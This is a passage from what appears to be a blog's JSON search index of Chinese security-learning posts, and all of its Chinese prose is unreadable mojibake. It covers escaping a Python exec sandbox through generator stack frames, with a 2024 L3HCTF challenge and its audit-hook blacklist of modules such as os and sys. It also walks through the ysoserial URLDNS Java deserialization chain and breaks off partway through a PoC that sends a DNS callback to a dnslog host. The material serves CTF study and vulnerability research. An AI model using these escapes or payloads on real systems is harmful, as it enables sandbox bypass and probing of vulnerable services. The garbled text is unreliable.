print(code.co_code) print( code.co_consts) print(code.co_filename)","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:3","tags":["python","æ²™ç®±é€ƒé€¸"],"title":"pythonæ ˆå¸§æ²™ç®±é€ƒé€¸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"å››ã€åˆ©ç”¨æ ˆå¸§æ²™ç®±é€ƒé€¸ åŸç†å°±æ˜¯é€šè¿‡ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡é€šè¿‡f_backï¼ˆè¿”å›å‰ä¸€å¸§ï¼‰ä»è€Œé€ƒé€¸å‡ºå»è·å–globalså…¨å±€ç¬¦å·è¡¨ ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š s3cret=\"this is flag\" def waff(): def f(): yield g.gi_frame.f_back g = f() #ç”Ÿæˆå™¨ frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ b = frame.f_globals['s3cret'] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals print(b) b=waff()æˆ–è€…ï¼š s3cret=\"this is flag\" def waff(): def f(): yield g.gi_frame.f_back g = f() #ç”Ÿæˆå™¨ frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ b = frame.f_back.f_globals['s3cret'] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals print(b) b=waff()ä¸ºä»€ä¹ˆéƒ½è¡Œå‘¢ï¼Œå¯ä»¥æŠŠframeè¿™ä¸ªæ ˆå¸§å¯¹è±¡æ‰“å°çœ‹çœ‹ï¼š åˆ†åˆ«æ˜¯ï¼š \u003cframe at 0x0000020F97255040, file 'D:\\\\yinwenmingtwo\\\\PythonCode\\\\æµ‹è¯•\\\\1.py', line 9, code waff\u003e \u003cframe at 0x00000176546465B0, file 'D:\\\\yinwenmingtwo\\\\PythonCode\\\\æµ‹è¯•\\\\1.py', line 13, code \u003cmodule\u003e\u003eåœ¨çœ‹çœ‹ä¸Šé¢çš„f_globals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚é”®æ˜¯å…¨å±€å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚ ä¸éš¾çœ‹å‡ºè¿™é‡Œå‡½æ•°å’Œæ¨¡å—æœ¬å°±åŒåœ¨ä¸€ä¸ªå…¨å±€ï¼Œæ‰€ä»¥éƒ½æœ‰å±æ€§s3cretï¼Œæ€ä¹ˆçœ‹åˆ°æ²¡åˆ°å…¨å±€ï¼Ÿç›´æ¥çœ‹fileå°±èƒ½çœ‹å‡ºã€‚ åœ¨ç»™ä¸ªä¾‹å­ï¼š s3cret=\"this is flag\" codes=''' def waff(): def f(): yield g.gi_frame.f_back g = f() #ç”Ÿæˆå™¨ frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ print(frame) print(frame.f_back) print(frame.f_back.f_back) b = frame.f_back.f_back.f_globals['s3cret'] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals return b b=waff() ''' locals={} code = compile(codes, \"test\", \"exec\") exec(code,locals) print(locals[\"b\"])è¿è¡Œç»“æœï¼š è¿™ä¸ªå…¶å®å¾—ä»ä¸‹å‘ä¸Šçœ‹ï¼Œæœ€å…ˆçš„å¸§æ˜¯execï¼Œç„¶åæ˜¯b=ï¼Œæœ€åæ˜¯8lineé‚£é‡Œçš„ä»£ç ã€‚ä¸€æ­¥ä¸€æ­¥å›åˆ°å…¨å±€å˜é‡ ","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:4","tags":["python","æ²™ç®±é€ƒé€¸"],"title":"pythonæ ˆå¸§æ²™ç®±é€ƒé€¸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"äº”ã€ç®€å•ç»•è¿‡ nextè¿‡æ»¤å¯ä»¥ç”¨listï¼Œsendï¼Œå’Œç”Ÿæˆå™¨è¡¨è¾¾å¼è¿›è¡Œç»•è¿‡ï¼Œ yieldè¿‡æ»¤ä¹Ÿå¯ä»¥ç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼è¿›è¡Œç»•è¿‡ ","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:5","tags":["python","æ²™ç®±é€ƒé€¸"],"title":"pythonæ ˆå¸§æ²™ç®±é€ƒé€¸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"å…­ã€ä¾‹é¢˜ 2024L3HCTF import sys import os codes=''' \u003c\u003ccodehere\u003e\u003e ''' try: codes.encode(\"ascii\") except UnicodeEncodeError: exit(0) if \"__\" in codes: print(\"__ bypass!!\") exit(0) codes+=\"\\nres=factorization(c)\" print(codes) locals={\"c\":\"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863\",\"__builtins__\": None} res=set() def blackFunc(oldexit): def func(event, args): blackList = [\"process\",\"os\",\"sys\",\"interpreter\",\"cpython\",\"open\",\"compile\",\"__new__\",\"gc\"] for i in blackList: if i in (event + \"\".join(str(s) for s in args)).lower(): print(\"noooooooooo\") print(i) oldexit(0) return func code = compile(codes, \"\u003cjudgecode\u003e\", \"exec\") sys.addaudithook(blackFunc(os._exit)) exec(code,{\"__builtins__\": None},locals) print(locals) p=int(locals[\"res\"][0]) q=int(locals[\"res\"][1]) if(p\u003e1e5 and q\u003e1e5 and p*q==int(\"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863\")): print(\"Correct!\",end=\"\") else: print(\"Wrong!\",end=\"\")å°±æ˜¯å¯ä»¥æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œæ»¡è¶³ä¸‹é¢çš„ifæ¡ä»¶å°±è¡Œã€‚ åšäº†ä¸€äº›è¿‡æ»¤ï¼Œè¿‡æ»¤æ‰äº†åŒä¸‹åˆ’çº¿ï¼Œ{\"__builtins__\": None} ç½®ç©ºäº†__builtins__ã€‚ è¿™é‡Œçš„ifæ¡ä»¶æ˜¯ï¼šé¦–å…ˆpå’Œqéƒ½å¾—å¤§äº100000ï¼Œå…¶æ¬¡å°±æ˜¯på’Œqçš„ç§¯ä¸ºint(â€œ69â€¦97863â€) æŒ‰ç…§é¢˜ç›®è¦æ±‚ï¼Œå¦‚æœé€šè¿‡ç®—æ³•åœ¨è¦æ±‚çš„5ç§’å®ç°åŸºæœ¬ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ²™ç®±å¤–çš„globalsçš„__builtins__å­—æ®µå»ä¿®æ”¹intå‡½æ•°ï¼Œå®ç°ç»•è¿‡ifè¯­å¥ï¼Œè¿™é“é¢˜çš„è§£é¢˜æ€è·¯å°±æ˜¯é€šè¿‡æ ˆå¸§å¯¹è±¡é€ƒé€¸å‡ºæ²™ç®±ä»è€Œè·å–åˆ°æ²™ç®±å¤–çš„globalsã€‚ ç”±äºè¿™é‡Œçš„{\"__builtins__\": None} ç½®ç©ºäº†__builtins__ï¼Œé‚£ä¹ˆå°±æ— æ³•ä½¿ç”¨next()å’Œsend()äº†ã€‚ä½†è¿˜å¯ä»¥ä½¿ç”¨ç”Ÿæˆå™¨çš„è¡¨è¾¾å¼ï¼Œä¸ºä»€ä¹ˆå¿…é¡»ç”¨ç”Ÿæˆå™¨ï¼Œä¸»è¦è¿˜æ˜¯å› ä¸ºå®ƒçš„å±æ€§gi_frameå¯ä»¥è·å¾—å½“å‰æ ˆå¸§å¯¹è±¡ï¼Œå½“ç„¶sys._getframe()ç­‰ä¹Ÿå¯ä»¥è·å¾—æ ˆå¸§å¯¹è±¡ï¼Œä¸è¿‡éœ€è¦å¼•å…¥sysæ¨¡å—ã€‚ ç”¨ç”Ÿæˆå™¨çš„è¡¨è¾¾å¼è·å¾—æ ˆå¸§å¯¹è±¡ a=(a.gi_frame.f_back.f_back for i in [1]) print(a) a=[x for x in a][0] print(a)ç®€å•è§£é‡Šä¸€ä¸‹ï¼šçœ‹æ¥ä¸Šé¢çš„ç”Ÿæˆå™¨è¡¨è¾¾å¼è¿™é‡Œå…¶å®å°±æ˜¯ï¼Œå…ˆæ‰§è¡Œi=1ï¼Œç„¶åæ‰§è¡Œa.gi_frame.f_back.f_backï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ç”¨åˆ°ç”Ÿæˆå™¨çš„ç‰¹æ€§ï¼Œåªæ˜¯å•çº¯åˆ©ç”¨ç”Ÿæˆå™¨æ¥è·å¾—æ ˆå¸§å±æ€§ã€‚ a=[x for x in a][0]ç­‰ä»·äºnext(a)å’Œlist(a)ï¼Œå°±æ˜¯è¿­ä»£æ‰§è¡Œå˜›ã€‚è‡³äºä¸¤ä¸ªf_backæ˜¯ä»ä¸‹ä¾æ¬¡å‘ä¸Šè¿”å›ã€‚ \u003cframe at 0x000001C18B6BA130, file 'D:\\\\yinwenmingtwo\\\\Pyt","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:6","tags":["python","æ²™ç®±é€ƒé€¸"],"title":"pythonæ ˆå¸§æ²™ç®±é€ƒé€¸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["javasec"],"content":"é…ç½®è°ƒè¯•ysoserial ä¸‹è½½é¡¹ç›®ysoserialï¼šhttps://github.com/frohoff/ysoserial ideaæ‰“å¼€ï¼Œåœ¨pom.xmlä¸‹è½½å¥½éœ€è¦ç”¨çš„æ‰€æœ‰ä¾èµ–ã€‚ä¸‹è½½ä¾èµ–çš„æ—¶å€™ä¸€å®šè¦æŠŠé…ç½®æ–‡ä»¶å…¨å‹¾ä¸Šï¼š ä¸‹è½½å®Œæˆï¼Œçœ‹åˆ°æ²¡æœ‰æŠ¥é”™åï¼Œå°±å¯ä»¥å¼€å§‹è°ƒè¯•ysoserialäº†ã€‚åœ¨ pom.xml ä¸­æ‰¾åˆ°å…¥å£ç±»ï¼š è·Ÿè¸ªå…¥å£ç±»ï¼Œå³é”®ç‚¹å‡»è°ƒè¯•å‘ç°åªä¼šæ‰“å°uageä¿¡æ¯ï¼š è¿™æ˜¯å› ä¸ºæˆ‘ä»¬æ²¡æœ‰ä¼ å…¥å‚æ•°ï¼Œéœ€è¦è¿›è¡Œè°ƒè¯•é…ç½®ï¼š ç„¶åå†æ¬¡ç‚¹å‡»è°ƒè¯•ï¼Œå‘ç°åºåˆ—åŒ–æˆåŠŸ(å‘ƒï¼Œä¸Šé¢çš„åœ°å€éœ€è¦åŠ ä¸ªhttp://å¤´)ï¼š ç„¶åå°±å¯ä»¥é€šè¿‡æ‰“æ–­ç‚¹å¯¹ysoserialçš„URLDNSé“¾è¿›è¡Œè°ƒè¯•äº†ã€‚ ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:1:0","tags":["java","ååºåˆ—åŒ–"],"title":"URLDNSé“¾åˆ†æ","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"URLDNSé“¾åˆ†æ URLDNS æ˜¯ysoserialä¸­åˆ©ç”¨é“¾çš„ä¸€ä¸ªåå­—ï¼Œé€šå¸¸ç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨Javaååºåˆ—åŒ–æ¼æ´ã€‚è¯¥åˆ©ç”¨é“¾å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š ä¸é™åˆ¶jdkç‰ˆæœ¬ï¼Œä½¿ç”¨Javaå†…ç½®ç±»ï¼Œå¯¹ç¬¬ä¸‰æ–¹ä¾èµ–æ²¡æœ‰è¦æ±‚ ç›®æ ‡æ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡DNSè¯·æ±‚æ¥éªŒè¯æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ URLDNSåˆ©ç”¨é“¾ï¼Œåªèƒ½å‘èµ·DNSè¯·æ±‚ï¼Œå¹¶ä¸èƒ½è¿›è¡Œå…¶ä»–åˆ©ç”¨ å­¦äº†å‰é¢çš„javaåºåˆ—åŒ–ï¼Œæˆ‘ä»¬çŸ¥é“äº†è¦æƒ³åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´å°±å¾—è¦é‡å†™readObjectï¼Œä¸ç„¶è¿æœ€åŸºæœ¬çš„ååºåˆ—åŒ–éƒ½åšä¸åˆ°ã€‚ ysoserialåœ¨URLDNS.javaä¸­å·²ç»å†™å‡ºäº†åˆ©ç”¨é“¾ï¼š Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode()å…ˆçœ‹URLDNS.javaç±»ï¼ˆå±äºysoserialå·¥å…·è‡ªå·±çš„ç±»ï¼‰ï¼š è¿™ä¸ªç±»ç»§æ‰¿äº†ä¸€ä¸ªæ³›å‹ä¸ºå¯¹è±¡çš„æ¥å£ï¼Œç„¶åç¬¬ä¸€æ­¥å…ˆå®ä¾‹åŒ–äº†ä¸€ä¸ªhandlerï¼ŒSilentURLStreamHandlerè¿™ä¸ªç±»ç»§æ‰¿äº†URLStreamHandlerï¼Œå¹¶é‡å†™openConnectionå’ŒgetHostAddressæ–¹æ³•è¿”å›ç©ºï¼Œè¿™ä¸ªä½œç”¨åé¢åœ¨è¯´ã€‚ ä¹‹ååˆ›å»ºhashMapã€URLå¯¹è±¡ï¼Œç„¶åå°†URLå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯DnsLogçš„åœ°å€putè¿›hashmapï¼ˆè¿™ä¸ªputæ–¹æ³•åé¢åœ¨è·Ÿè¿›ç»†è¯´ï¼‰ã€‚ ç„¶åé€šè¿‡åå°„è°ƒç”¨é‡ç½®hashCodeçš„å€¼ä¸º-1ï¼Œå†è¿”å›ï¼ˆä½œåé¢å†è¯´ï¼‰ã€‚ å¯ä»¥çœ‹å‡ºï¼šæœ€ç»ˆçš„payloadç»“æ„æ˜¯ä¸€ä¸ªHashMapï¼Œé‡Œé¢åŒ…å«äº† ä¸€ä¸ªä¿®æ”¹äº†HashCodeä¸º-1çš„URLç±»ã€‚ è·Ÿè¿›åˆ°HashMapç±» å¯ä»¥çœ‹åˆ°HashMapæ˜¯ä¸ªæ³›å‹å¯ä»¥æ¥å—ç±»ï¼Œå¹¶ä¸”ç»§æ‰¿äº†Serializableæ¥å£ï¼Œå¯ä»¥å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨readObjectå‡½æ•°ï¼Œæœç´¢å‘ç°è¿™é‡Œé‡å†™çš„readObject()å‡½æ•°ã€‚ çº¢æ¡†ä¸Šé¢çš„å°±æ˜¯ä¸€äº›å¯¹ä¼ å…¥æ•°æ®çš„æ£€æµ‹ï¼Œæ–¹æ³•ä¸­æœ€å…³é”®çš„å°±æ˜¯çº¢æ¡†éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹å‡ºé€šè¿‡ååºåˆ—åŒ–å–å‡ºäº†kå’Œvå¹¶å¯¹å…¶è°ƒç”¨putValæ–¹æ³•ã€‚ è·Ÿè¿›è¡ŒputValæ–¹æ³•æ²¡æœ‰ä»€ä¹ˆå¥½çœ‹çš„ï¼Œå°±æ˜¯æŠŠkå’Œvæ”¾å…¥tableä¸­ã€‚ å›åˆ°readObjectçš„putValæ–¹æ³•é‡Œé¢è¿˜è°ƒç”¨äº†hashæ–¹æ³•å¤„ç†æˆ‘ä»¬ä¼ å…¥keyã€‚ è·Ÿè¿›hash()ï¼Œçœ‹åˆ°è¿™ä¸ªæ–¹æ³•çš„å†…å®¹å¹¶ä¸å¤šã€‚ ä¼šå…ˆåˆ¤æ–­keyæ˜¯å¦ä¸ºç©ºï¼Œä¸æ˜¯ç©ºå°±è°ƒç”¨hashCodeæ¥è·å–å€¼çš„å“ˆå¸Œç ï¼ˆå³ç”Ÿæˆå“ˆå¸Œå€¼ï¼‰ã€‚è¿™é‡Œè®© key ä¸º URL å¯¹è±¡ï¼Œé‚£ä¹ˆkey.hashCode()è°ƒç”¨URLç±»ä¸­çš„hashCodeæ–¹æ³•ï¼šjava.net.URL#hashCodeï¼Œè·Ÿè¿›ä¸€ä¸‹ã€‚ å¦‚æœhashCodeä¸ç­‰äº-1åˆ™ç›´æ¥è¿”å›ï¼Œè¡¨ç¤ºå·²ç»ç®—è¿‡äº†ï¼Œå¦åˆ™å°±è°ƒç”¨handlerç±»é‡Œé¢çš„hashCodeæ–¹æ³•ã€‚ä¸Šé¢å¯ä»¥çœ‹åˆ°hashCodeé»˜è®¤å°±æ˜¯-1ã€‚ é‚£ä¹ˆå¯ä»¥è·Ÿè¿›handlerçš„hashCodeæ–¹æ³•ï¼Œ getHostAddressæ˜¯è·å–ipåœ°å€ï¼Œè·Ÿè¿›ä¸€ä¸‹getHostAddressæ–¹æ³•ï¼Œåˆ°è¾¾æœ€ç»ˆåˆ©ç”¨åœºæ™¯ã€‚ å¯ä»¥çœ‹åˆ°å…¶é€»è¾‘ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰ä¸»æœºåï¼Œæœ‰å°±ç›´æ¥è¿”å›ï¼Œæ²¡æœ‰å°±æ‰§è¡ŒgetByNameè§¦å‘è§£æç„¶åè¿”å›ã€‚ é‚£ä¹ˆé“¾å­ä¸»è¦çš„å°±è¿™äº›äº†ï¼Œä½†æ€ä¹ˆæ„Ÿè§‰è¿™ä¸ªé“¾å­ä¼¼ä¹å’Œæˆ‘ä»¬çš„payloadæ²¡æœ‰å…³ç³»å‘¢ã€‚ç¡®å®æ²¡æœ‰å…³ç³»ï¼Œè¿™é‡Œåˆ†æçš„URLDNSé“¾æ˜¯åˆ©ç”¨é“¾ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä¼ å…¥payloadåˆ°readObjectè¿›è¡Œåˆ©ç”¨æœ€åä¼šé€ æˆDNSè§£æã€‚ ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:2:0","tags":["java","ååºåˆ—åŒ–"],"title":"URLDNSé“¾åˆ†æ","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"ysoserialç”Ÿæˆpayloadåˆ†æ è¿™é‡Œç”Ÿæˆpaylaodæ˜¯è¿›è¡Œçš„åºåˆ—åŒ–ï¼Œåˆ©ç”¨çš„writeObjectæ–¹æ³•æ¥æŠŠurlè¿›è¡Œåºåˆ—åŒ–ï¼Œä»ä¸Šé¢çš„URLDNSç±»ä¸éš¾çœ‹åˆ°å…¶è°ƒç”¨äº†hashMapçš„putæ–¹æ³•ï¼Œè·Ÿè¿›putæ–¹æ³•ï¼š å‘ç°ä¹Ÿæ˜¯putValæ–¹æ³•ï¼Œåé¢çš„å°±å’ŒreadObjectä¸­ä¸€æ ·äº†ï¼Œä¼šå¯¹urlè¿›è¡Œè§£æã€‚ä½†ä¸ºä»€ä¹ˆåœ¨ç”Ÿæˆpayloadæ—¶æ˜æ˜è°ƒç”¨äº†putæ–¹æ³•å´åœ¨DNSlogå¹¶æ²¡æœ‰æ”¶åˆ°è¯·æ±‚å‘¢ã€‚ å›åˆ°æœ€å¼€å§‹è¯´çš„ï¼Œå‘ç°é‡å†™äº†openConnectionå’ŒgetHostAddressæ–¹æ³•ä½¿å…¶è¿”å›ä¸ºç©ºï¼Œåœ¨è°ƒè¯•æ—¶ä»putæ–¹æ³•æ­¥è¿‡ä¹Ÿå¯ä»¥çœ‹åˆ°ç›´æ¥åˆ°äº†return nullï¼Œæ‰€ä»¥ä¸Šé¢é‡å†™çš„ç›®çš„å°±æ˜¯ä¸ºäº†é˜²æ­¢åœ¨ç”Ÿæˆpayloadæ—¶å‘èµ·DNSè§£æï¼Œè‡³äºé‡å†™openConnectionæ–¹æ³•çš„ä½œç”¨æ˜¯å®ç°ç±»å¿…é¡»å®ç°çˆ¶ç±»çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ã€‚ä½†æ˜¯å¦‚æœçœ‹åˆ°æˆ‘ä¸‹é¢è¿›è¡ŒéªŒè¯æ—¶ä¼šå‘ç°readObjectåœ¨è°ƒç”¨æ—¶ä¸ºä»€ä¹ˆåˆä¼šè¿›è¡Œè§£æã€‚ å…¶å®å…·ä½“è°ƒç”¨å“ªä¸ªç±»çš„getHostAddressæ–¹æ³•æ˜¯ç”±handleræ¥çœ‹çš„ï¼Œè·Ÿè¿›hanlderå‘ç°putæ—¶çš„handleræ˜¯ï¼š è€Œåœ¨ååºåˆ—åŒ–æ—¶ï¼ŒURLStreamHandleræ˜¯ç”±transientä¿®é¥°çš„ï¼Œè¢«transientä¿®é¥°çš„å˜é‡æ— æ³•è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥æœ€ç»ˆååºåˆ—åŒ–è¯»å–å‡ºæ¥çš„transientä¾æ—§æ˜¯å…¶åˆå§‹å€¼ï¼Œä¹Ÿå°±æ˜¯URLStreamHandlerï¼Œæ‰€ä»¥æœ€åè¿˜æ˜¯è°ƒç”¨çš„URLStreamHandlerçš„getHostAddressæ–¹æ³•ã€‚ é‚£ä¹ˆç”Ÿæˆpayloadæ—¶æŠŠhashCodeè®¾ä¸º-1åˆæ˜¯ä¸ºä»€ä¹ˆå‘¢ã€‚è¿™æ˜¯å› ä¸ºåœ¨å‰é¢HashMap#putæ—¶å·²ç»è°ƒç”¨è¿‡ä¸€æ¬¡hashCode()å‡½æ•°ï¼ŒhashCodeçš„å€¼ä¼šæ”¹å˜ä¸å†ä¸º-1ï¼Œé‚£ä¹ˆè¿›è¡Œæ¼æ´éªŒè¯ä¼ å…¥readObjectæ—¶å°±ä¼šç›´æ¥è¿”å›HashCodeå€¼äº†ã€‚æ‰€ä»¥è¿˜å¾—åˆ©ç”¨åå°„æ¥è®©hashCodeå˜ä¸º-1ã€‚ ç»¼ä¸Šæ€ä¹ˆæ„Ÿè§‰putè¿™ä¹ˆéº»çƒ¦åˆä¼šè§¦å‘dnsè§£æåˆä¼šè®©hashCodeä¸ä¸º-1ï¼Œå°±ä¸èƒ½å»æ‰å—ï¼Ÿ è¿™é‡Œå°±è¦çœ‹è¿›è¡Œåºåˆ—åŒ–æ—¶é‡å†™çš„writeObjectæ–¹æ³•äº†ï¼š çœ‹åˆ°å°±æ˜¯å°†å¯¹è±¡çš„é»˜è®¤åºåˆ—åŒ–å†™å…¥åˆ°è¾“å‡ºæµå’Œå°† buckets å˜é‡çš„å€¼å’Œsizeå˜é‡çš„å€¼å†™å…¥åˆ°è¾“å‡ºæµã€‚è¿˜æœ‰å°±æ˜¯æœ‰ä¸ªè‡ªå®šä¹‰çš„æ–¹æ³•ï¼Œè·Ÿè¿›çœ‹çœ‹ï¼š å¯ä»¥å‘ç°å®ƒè®©tabå€¼ç­‰äºtableå€¼ï¼Œç„¶åä»ä¸­å–å‡ºé”®å€¼è¿›è¡Œåºåˆ—åŒ–ã€‚é‚£ä¹ˆè¿™ä¸ªtableæ˜¯å“ªæ¥çš„å‘¢ï¼Ÿ å°±æ˜¯putæ–¹æ³•ä¸­çš„putValæ”¹å˜çš„ã€‚æ‰€ä»¥éœ€è¦è°ƒç”¨putæ–¹æ³•æ‰èƒ½æˆåŠŸåºåˆ—åŒ–ã€‚è‡³äºååºåˆ—å°±å’Œtableæ²¡æœ‰å…³ç³»äº†ï¼Œå°±æ˜¯æ­£å¸¸çš„è¿›è¡Œååºåˆ—åŒ–æ‹¿åˆ°kvå€¼ã€‚ ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:3:0","tags":["java","ååºåˆ—åŒ–"],"title":"URLDNSé“¾åˆ†æ","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"ysoserialéªŒè¯æ•´æ¡URLDNSé“¾å­ æœ€åå¯ä»¥åˆ©ç”¨PayloadRunner.run()æ¥è¿›è¡Œä¸€æ¬¡å®Œæˆçš„åˆ©ç”¨ã€‚ é…ç½®å¥½å‚æ•°åå¼€å§‹æ¡è°ƒè¯•ï¼š ç»§ç»­å‘ä¸‹è¿è¡Œï¼Œå¯ä»¥çœ‹åˆ°å¯¹payloadè¿›è¡Œäº†åºåˆ—åŒ–ï¼Œ è°ƒç”¨çš„åºåˆ—åŒ–å‡½æ•°writeObjectæ˜¯hashMapé‡å†™åçš„ ç»§ç»­å‘ä¸‹ï¼Œæ¥ä¸‹æ¥è¦è¿›è¡Œçš„æ˜¯ååºåˆ—åŒ–ã€‚ è·Ÿè¿›å‘ç°è°ƒç”¨çš„å°±æ˜¯hashMapçš„readObjectæ–¹æ³•ã€‚ readObjectåé¢çš„å†…å®¹æˆ‘ä»¬å°±ç†Ÿæ‚‰äº†ï¼Œä¸Šé¢ä¹Ÿè¯´äº†readObjectä¸‹é¢è°ƒç”¨çš„getHostAddresså°±æ˜¯URLStreamHandlerç±»çš„ï¼Œæ‰€ä»¥æœ€åæ‰§è¡Œä¼šæœ‰ä¸€æ¬¡è§£æï¼Œåœ¨dnslogå¹³å°å¯ä»¥çœ‹åˆ°ã€‚ è‡³æ­¤å·¥å…·ysoserialçš„ç”±ç”Ÿæˆpayloadåˆ°æ‰§è¡Œpayloadçš„é“¾å­å°±è¿™æ ·äº†ã€‚ ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:4:0","tags":["java","ååºåˆ—åŒ–"],"title":"URLDNSé“¾åˆ†æ","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"pocé“¾è°ƒè¯• å¦‚æœæŠŠysoserialçš„æ•´ä¸ªURLDNSé“¾ç†æ¸…æ¥šäº†ï¼Œå…¶å®å°±å¯ä»¥è‡ªå·±ç¼–å†™payloadè¿›è¡Œè°ƒè¯•äº†ã€‚ pocï¼š import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.net.URL; import java.util.HashMap; import java.lang.reflect.Field; public class URLDemo { public static void main(String[] args)throws Exception{ HashMap hashMap = new HashMap(); //åˆ›å»ºHashMapçš„å¯¹è±¡hashMap URL url = new URL(\"http://2faede01.log.dnslog.biz.\"); //åˆ›å»ºURLå¯¹è±¡ï¼Œå«æœ‰æˆ‘ä»¬çš„url Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); //åå°„è°ƒç”¨ç§æœ‰å˜é‡hashCode f.setAccessible(true); //ä½¿ç§æœ‰å˜é‡èƒ½å¤Ÿè¢«ä¿®æ”¹ f.set(url, 10086); //ä¸ä¸º-1å°±è¡Œï¼Œä¸è§¦å‘è§£æï¼Œysoserialä½¿é€šè¿‡é‡å†™getHostAddressæ¥å®ç°çš„ hashMap.put(url, \"gaoren\"); //putå…¥æˆ‘ä»¬çš„é”®å€¼ï¼Œå€¼éšä¾¿ä»€ä¹ˆéƒ½è¡Œ f.set(url, -1); //ä¿®æ”¹hashCodeä¸º-1 System.out.println(hashMap); //åºåˆ—åŒ–ï¼Œå‚è€ƒjavaåºåˆ—åŒ– try { FileOutputStream out=new FileOutputStream(\"dnsser.bin\"); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(hashMap); objout.close(); out.close(); //ååºåˆ—åŒ–ï¼Œå‚è€ƒjavaååºåˆ—åŒ– FileInputStream in=new 